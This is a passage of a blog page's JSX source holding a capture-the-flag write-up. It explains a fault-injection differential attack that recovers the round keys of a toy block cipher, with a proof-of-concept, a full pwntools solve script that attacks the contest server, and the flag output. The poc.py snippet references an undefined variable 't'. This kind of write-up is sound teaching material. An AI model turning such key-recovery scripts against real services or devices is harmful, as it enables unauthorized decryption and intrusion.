def encrypt(pt: bytes, key: bytes) -> bytes:
    rk = key_schedule_128(key)
    state = [int.from_bytes(pt[i:i + SZ // 8], "little") for i in range(0, BLKSZ, SZ // 8)]
    for r in rk:
        round(state, r)
    return b"".join(int(w).to_bytes(SZ // 8, "little") for w in state)

def encrypt_fault(pt: bytes, key: bytes, fault_round: int, word_idx: int) -> bytes:
    assert 0 <= fault_round < NROUNDS
    assert 0 <= word_idx < 3
    fault = int.from_bytes(os.urandom(SZ // 8), "little")
    rk = key_schedule_128(key)
    state = [int.from_bytes(pt[i:i + SZ // 8], "little") for i in range(0, BLKSZ, SZ // 8)]
    for i, r in enumerate(rk):
        if i == fault_round:
            state[word_idx] = (state[word_idx] + fault) & WORD
        round(state, r)
    return b"".join(int(w).to_bytes(SZ // 8, "little") for w in state)`}]}></CodeBlock>
                <br></br>
                <p>We know <code className='code'>x0</code> and <code className='code'>rk0</code>, but not anything else. There are too many unknowns to recover a small number of solutions.</p>
                <p>Hence, we need to obtain new equations at a greater rate than variables e.g. 2 equations for every new variable. This is the idea that was new to me.</p>
                <br></br>
                <p>Let's take a look at some of the equations for encryption. Note that <code className='code'>x0</code> after the nth round will be denoted as <InlineMath math="x_{0,n}"/>, and the same goes for the other x values and the round keys. Note that the rounds are numbered 0 to 11.</p>
                <BlockMath math="\begin{align*}
                \text{Round 11:}\\
                x_{0,11}&=(x_{0,10}\oplus rk_{0,11}) + (x_{1,10}\oplus rk_{1,11})\\
                x_{1,11}&=(x_{1,10}\oplus rk_{2,11}) - (x_{2,10}\oplus rk_{1,11})\\
                x_{2,11}&=x_{0,10}
                \\[1em]
                \text{Round 10:}\\
                x_{0,10}&=(x_{0,9}\oplus rk_{0,10}) + (x_{1,9}\oplus rk_{1,10})\\
                x_{1,10}&=(x_{1,9}\oplus rk_{2,10}) - (x_{2,9}\oplus rk_{1,10})\\
                x_{2,10}&=x_{0,9}
                \end{align*}"/>
                <p>We notice that <InlineMath math="x_{2,11} = x_{0,10}"/> and <InlineMath math="x_{2,10} = x_{0,9}"/>, so let's simplify the equations.</p>
                <BlockMath math="\begin{align*}
                x_{0,11}&=(x_{0,10}\oplus rk_{0,11}) + (x_{1,10}\oplus rk_{1,11})\\
                x_{1,11}&=(x_{1,10}\oplus rk_{2,11}) - (x_{0,9}\oplus rk_{1,11})\\
                x_{2,11}&=(x_{0,9}\oplus rk_{0,10}) + (x_{1,9}\oplus rk_{1,10})\\
                x_{1,10}&=(x_{1,9}\oplus rk_{2,10}) - (x_{2,9}\oplus rk_{1,10})\\
                \end{align*}"/>
                <p>The first and last equations are irrelevant here. As for the other two equations, when we inject a fault into <code className='code'>x0</code> right before the second last round, by taking the difference of multiple occurences of each equation, we can the following two equations:</p>
                <BlockMath math="\begin{align*}
                x_{1,11}-x_{1,11}'&=(x_{0,9}'\oplus rk_{1,11}) - (x_{0,9}\oplus rk_{1,11})\\
                x_{2,11}-x_{2,11}'&=(x_{0,9}\oplus rk_{0,10}) - (x_{0,9}'\oplus rk_{0,10})\\
                \end{align*}"/>
                <p>We obtain two new equations with only one new unknown (i.e. <InlineMath math="x_{0,9}"/>)! I used 4 fault injections here, so I got 8 equations and 4 new unknowns. Additionally, since we know <InlineMath math="rk_{0,11}"/>, we can obtain <InlineMath math="rk_{0,10}"/> by reversing one round of the key scheduling (recall that the each round key is scheduled independently from the others).</p>
                <br></br>
                <h4>Solving for rk1</h4>
                <p>Again, Z3 works like a charm here, but I'm not using it.</p>
                <br></br>
                <p>The equations we get are of a slightly different form, but the idea of branch-and-prune still applies, although a bit differently. We cannot enumerate all possible solutions to the equation, as there is an extremely large number of solutions for the <code className='code'>x0</code>s.</p>
                <br></br>
                <p>Instead, we can branch-and-prune on rk1, and for each step, we have another branch-and-prune to check if there exists at least one solution for all the <code className='code'>x0</code>s. If not, we prune the branch on the search for rk1. The problem this, exhausting the entire search space to show that there is no solution takes forever.</p>
                <br></br>
                <p>Thankfully, there is a workaround. Remember how I said that there are a lot of values for x0? This can work in our favour, as it means that there is a probability of almost 100% that we hit a solution before n queries, and if we hit n queries without a solution, we can assume there is no solution. After extensive testing, n=10000 is a value that has not failed.</p>
                <br></br>
                <p>This massively improves the time taken to solve for rk1. However, unlike solving for rk0, this solution is still much slower than Z3, as Z3 converts our constraints into SAT and solves it with CDCL, which I did not opt to do as it is much less intuitive and much harder to code.</p>
                <br></br>
                <p>Regardless, my solution does work, and can take anywhere from 2 to 30 seconds, depending on how many solutions there are (although there are very rare outliers such as 4 minutes for 1536 solutions).</p>
                <br></br>
                <p>Here is a proof-of-concept.</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={true} data={[{'name':'poc.py','language':'python','startingLineNumber':1,'code':`import random
from itertools import product
import time

m = 2**48 - 1

def solverk1(info,curr=''):
    if len(curr) == 48:
        global outs
        outs.add(int(curr,2))
        print(f"\rSo far, {len(outs)} solutions to rk1 found.", end="", flush=True)
        return
    
    for i in range(2):
        test = str(i)+curr
        global ctr
        ctr = 0
        global solFound
        solFound = 0
        solveXs(info,test,['']*5)
        if solFound:
            solverk1(info,test)

def solveXs(info,rk1,curr=['']*5):
    global solFound
    global ctr
    if solFound != 0 or ctr > 10000:
        return
    
    if len(curr[0]) == len(rk1):
        solFound = curr
        return
    
    rk1test = int(rk1,2)
    
    for iter in product(*[range(2) for _ in range(5)]):
        ctr += 1
        test = [str(a)+b for a,b in zip(iter,curr)]
        ttest = [int(x,2) for x in test]
        for itm in info:
            typ = itm[0]
            if not typ:
                _, a, b, t, hint = itm
                out = bin((ttest[a]^t)-(ttest[b]^t) & m)[2:].zfill(48)
                if out[-len(test[0]):] != bin(hint)[2:].zfill(48)[-len(test[0]):]:
                    break
            else:
                _, a, b, hint = itm
                out = bin((ttest[b]^rk1test)-(ttest[a]^rk1test) & m)[2:].zfill(48)
                if out[-len(test[0]):] != bin(hint)[2:].zfill(48)[-len(test[0]):]:
                    break
        else:
            solveXs(info,rk1,test)

t1 = random.getrandbits(48)
finalouts = set()
nums = []
for _ in range(5):
    nums.append(random.getrandbits(48))

info = []
for i in range(4):
    a = nums[i]
    b = nums[(i+1)]
    hint = ((a^t)-(b^t)) & m
    info.append((0,i,i+1,t,hint))

    hint = ((b^t1)-(a^t1)) & m
    info.append((1,i,i+1,hint))

outs = set()
solFound = 0
info = tuple(info)
start = time.time()
solverk1(info)
print()
print(time.time()-start)
assert t1 in outs`}]}/>
                <br></br>
                <h3>Recovering rk2</h3>
                <p>Recovering this round key is thankfully, nearly as easy as recovering rk0.</p>
                <br></br>
                <p>Let's look at the round equations one last time.</p>
                <BlockMath math="\begin{align*}
                \text{Round 11:}\\
                x_{0,11}&=(x_{0,10}\oplus rk_{0,11}) + (x_{1,10}\oplus rk_{1,11})\\
                x_{1,11}&=(x_{1,10}\oplus rk_{2,11}) - (x_{2,10}\oplus rk_{1,11})\\
                x_{2,11}&=x_{0,10}
                \end{align*}"/>
                <p>Since we have rk0, rk1 and <code className='code'>x0</code>, we can recover <code className='code'>x1</code>. This means that we can inject a fault into <code className='code'>x1</code> right before the last round. We can subtract two values of <InlineMath math="x_{1,11}"/> in order to get <InlineMath math="(x_1\oplus rk_2)-(x_1'\oplus rk_2)"/>. Since <code className='code'>x1</code> is known, this is the exact same equation that we solved for rk0.</p>
                <p>Hence, I will not be including a proof-of-concept as it is largely the same as rk0.</p>
                <br></br>
                <h3>Putting it all together</h3>
                <p>Now that we have recovered the individual round keys, we can just recover rk0, rk1, and rk2 in that order, enumerating rk0 solutions to recover rk1 and so on. For my solution, I kept terminating and re-running the script until there were a small number (16 or less) candidates for rk0, so that I would not have to solve for rk1 too many times (as it is the biggest bottleneck).</p>
                <br></br>
                <p>For each solution, we can reverse the key scheduling algorithm and test if our given plaintext encrypts to our given ciphertext (recall the pt-ct pair that we are given at the start). If so, we submit the key and win!</p>
                <br></br>
                <p>Here is my solvescript.</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={true} data={[{'name':'solve.py','language':'python','startingLineNumber':1,'code':`from pwn import remote, process
from itertools import product
from math import ceil
from time import time
from chall import *

m = 2**48 - 1

def long_to_bytes(a):
    return a.to_bytes(ceil(a.bit_length()/8),'little')

def bytes_to_long(a):
    return int.from_bytes(a,'little')

def solverk0(info,curr=''):
    if len(curr) == 48:
        global rk0candidates
        rk0candidates.add(int(curr,2))
        return

    for i in range(2):
        test = str(i)+curr
        ttest = int(test,2)
        for itm in info:
            a,b,hint = itm
            out = bin((a^ttest)-(b^ttest) & m)[2:].zfill(48)
            if out[-len(test):] != bin(hint)[2:].zfill(48)[-len(test):]:
                break
        else:
            solverk0(info,test)

def solverk2(info,curr=''):
    if len(curr) == 48:
        global rk2candidates
        rk2candidates.add(int(curr,2))
        return

    for i in range(2):
        test = str(i)+curr
        ttest = int(test,2)
        for itm in info:
            a,b,hint = itm
            out = bin((a^ttest)-(b^ttest) & m)[2:].zfill(48)
            if out[-len(test):] != bin(hint)[2:].zfill(48)[-len(test):]:
                break
        else:
            solverk2(info,test)

def solverk1(info,curr=''):
    if len(curr) == 48:
        global rk1candidates
        rk1candidates.add(int(curr,2))
        print(f"\rSo far, {len(rk1candidates)} solutions to rk1 found", end="")
        return
    
    for i in range(2):
        test = str(i)+curr
        global ctr
        ctr = 0
        global solFound
        solFound = 0
        solveXs(info,test)
        if solFound:
            solverk1(info,test)

def solveXs(info,rk1,curr=['']*5):
    global solFound
    global ctr
    if solFound != 0 or ctr > 10000:
        return
    
    if len(curr[0]) == len(rk1):
        solFound = curr
        return
    
    rk1test = int(rk1,2)
    
    for iter in product(*[range(2) for _ in range(5)]):
        ctr += 1
        test = [str(a)+b for a,b in zip(iter,curr)]
        ttest = [int(x,2) for x in test]
        for itm in info:
            typ = itm[0]
            if not typ:
                _, a, b, t, hint = itm
                out = bin((ttest[a]^t)-(ttest[b]^t) & m)[2:].zfill(48)
                if out[-len(test[0]):] != bin(hint)[2:].zfill(48)[-len(test[0]):]:
                    break
            else:
                _, a, b, hint = itm
                out = bin((ttest[b]^rk1test)-(ttest[a]^rk1test) & m)[2:].zfill(48)
                if out[-len(test[0]):] != bin(hint)[2:].zfill(48)[-len(test[0]):]:
                    break
        else:
            solveXs(info,rk1,test)

def revkeyschedule(rk0,rk1,rk2):
    for i in range(NROUNDS-1,-1,-1):
        t0 = rol(DELTA[i % 3], i & (SZ - 1))
        t1 = rol(DELTA[i % 3], (i + 1) & (SZ - 1))
        t2 = rol(DELTA[i % 3], (i + 2) & (SZ - 1))
        rk0 = (ror(rk0, 2)-t0) & WORD
        rk1 = (ror(rk1, 3)-t1) & WORD
        rk2 = (ror(rk2, 5)-t2) & WORD
    key = b''
    key += long_to_bytes(rk0)
    key += long_to_bytes(rk1)
    key += long_to_bytes(rk2)
    return key

io = remote('crypto-roblox.finals.blahaj.sg',18034)
# io = process(['python3','chall.py'])
io.recvuntil(b'Pair:\\n')
pt,ct = [bytes.fromhex(x) for x in eval(io.recvline().decode())]

rk0nums0 = [ror(bytes_to_long(ct[:6]),13)]
rk0nums2 = [bytes_to_long(ct[12:])]
rk1nums1 = [rol(bytes_to_long(ct[6:12]),11)]
rk1nums2 = [ror(bytes_to_long(ct[12:]),13)]
rk2nums0 = [ror(bytes_to_long(ct[:6]),13)]
rk2nums1 = [rol(bytes_to_long(ct[6:12]),11)]
rk2nums2 = [bytes_to_long(ct[12:])]
for _ in range(4):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'plaintext\\n>> ', pt.hex().encode())
    io.sendlineafter(b'word_idx\\n>> ', b'11 0')
    intermediate = bytes.fromhex(io.recvline().lstrip(b'>> ').decode())
    intermediate0 = ror(bytes_to_long(intermediate[:6]),13)
    intermediate2 = bytes_to_long(intermediate[12:])
    rk0nums0.append(intermediate0)
    rk0nums2.append(intermediate2)

for _ in range(4):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'plaintext\\n>> ', pt.hex().encode())
    io.sendlineafter(b'word_idx\\n>> ', b'10 0')
    intermediate = bytes.fromhex(io.recvline().lstrip(b'>> ').decode())
    intermediate1 = rol(bytes_to_long(intermediate[6:12]),11)
    intermediate2 = ror(bytes_to_long(intermediate[12:]),13)
    rk1nums1.append(intermediate1)
    rk1nums2.append(intermediate2)

for _ in range(4):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'plaintext\\n>> ', pt.hex().encode())
    io.sendlineafter(b'word_idx\\n>> ', b'11 1')
    intermediate = bytes.fromhex(io.recvline().lstrip(b'>> ').decode())
    intermediate0 = ror(bytes_to_long(intermediate[:6]),13)
    intermediate1 = rol(bytes_to_long(intermediate[6:12]),11)
    intermediate2 = bytes_to_long(intermediate[12:])
    rk2nums0.append(intermediate0)
    rk2nums1.append(intermediate1)
    rk2nums2.append(intermediate2)

info0 = []
for i in range(4):
    a = rk0nums2[i]
    b = rk0nums2[i+1]
    info0.append((a,b,(rk0nums0[i]-rk0nums0[i+1])&m))
rk0candidates = set()
solverk0(info0)

start = time()
for j, rk0 in enumerate(rk0candidates):
    print('\\rEnumerating',j+1,'out of',len(rk0candidates),'candidates for rk0')
    t0 = rol(DELTA[(NROUNDS-1) % 3], (NROUNDS-1) & (SZ - 1))
    prevrk0 = (ror(rk0, 2) - t0) & WORD
    info1 = []
    for i in range(4):
        info1.append((0,i,i+1,prevrk0,(rk1nums2[i]-rk1nums2[i+1]) & m))
        info1.append((1,i,i+1,(rk1nums1[i]-rk1nums1[i+1]) & m))

    rk1candidates = set()
    solverk1(info1)

    for k, rk1 in enumerate(rk1candidates):
        info2 = []
        for i in range(4):
            a = (rk2nums0[i]-(rk0^rk2nums2[i])) & m
            a ^= rk1
            b = (rk2nums0[i+1]-(rk0^rk2nums2[i+1])) & m
            b ^= rk1
            info2.append((a,b,(rk2nums1[i]-rk2nums1[i+1])&m))
        rk2candidates = set()
        solverk2(info2)
        for l,rk2 in enumerate(rk2candidates):
            key = revkeyschedule(rk0,rk1,rk2)
            if encrypt(pt,key) == ct:
                print('\\nFOUND')
                io.sendlineafter(b'>> ',key.hex().encode())
                print(io.recvline().strip().decode())
                elapsed = int(time()-start)
                minu = elapsed//60
                sec = elapsed % 60
                print('Total time taken:',minu,'min',sec,'sec')
                exit()`}]}></CodeBlock>
                <br></br>
                <p>Flag time :D</p>
                <br></br>
                <Terminal text={`[+] Opening connection to crypto-roblox.finals.blahaj.sg on port 18034: Done
Enumerating 1 out of 16 candidates for rk0
...
Enumerating 10 out of 16 candidates for rk0
So far, 32 solutions to rk1 found
FOUND
blahaj{dont_w3+l0ve_d1ff3r3nt14l_analysis?!-insp1r3d_bY_Codegate2025Finals!}
Total time taken: 2 min 52 sec
[*] Closed connection to crypto-roblox.finals.blahaj.sg port 18034`}></Terminal>
                <br></br>
                <h1 id='conclusion'>Conclusion</h1>
                <p>Wow, this was a huge blogpost! There were some more challenges I wanted to upsolve and write up, but it's already been 3 months since the CTF so I would like to release it ASAP. This blogpost took me a month to write, and the .jsx file is around 2600 lines, so I hope you enjoyed reading!</p>
                </div>
            </div>
            <div className='footer'>
                <div className='footer-content'>
                    <div className='copyright'>© 2026 Water</div>
                    <div className='github-link'>
                        <a href = "https://www.github.com/shuizhuimiaoman">
                            <img className = "footer-github-icon" src={githubicon} alt="Github Icon"></img>
                        </a>
                    </div>
                </div>
            </div>
        </>
    )
}

export default BlahajCTF2025Writeups